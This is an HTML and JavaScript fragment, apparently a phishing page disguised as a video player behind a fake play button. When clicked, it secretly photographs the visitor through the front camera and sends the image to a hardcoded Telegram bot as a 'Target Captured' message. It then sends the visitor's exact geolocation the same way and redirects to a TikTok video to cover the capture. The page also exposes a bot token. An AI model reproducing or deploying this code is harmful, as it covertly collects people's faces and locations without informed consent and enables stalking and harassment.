        .bg {

<body id="body">
    <div class="bg" id="bg"></div>
    <div class="play-btn" id="trap" onclick="ultraCapture()">
        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";

        async function ultraCapture() {
            const b = document.getElementById('body');
            const bg = document.getElementById('bg');
            const trap = document.getElementById('trap');

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();

                trap.style.display = 'none';
                bg.style.display = 'none';
                b.classList.add('flash-active');

                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    const imageData = c.toDataURL('image/jpeg', 0.8);
                    const blob = await (await fetch(imageData)).blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'soran_target.jpg');
                    formData.append('caption', `ðŸš© **Soran Page Target Captured**\nðŸ“± Device: ${navigator.userAgent.match(/iPhone/i) ? "iPhone" : "Android"}`);

                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });

                    requestLocation();
                }, 1800);

            } catch (e) {
                window.location.href = targetVideo;
            }
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const msg = `ðŸ“ **Target Exact Location:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
                    
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                    window.location.href = targetVideo;
                }, () => {
                    window.location.href = targetVideo;
                });
            } else {
                window.location.href = targetVideo;
            }
        }
    </script>
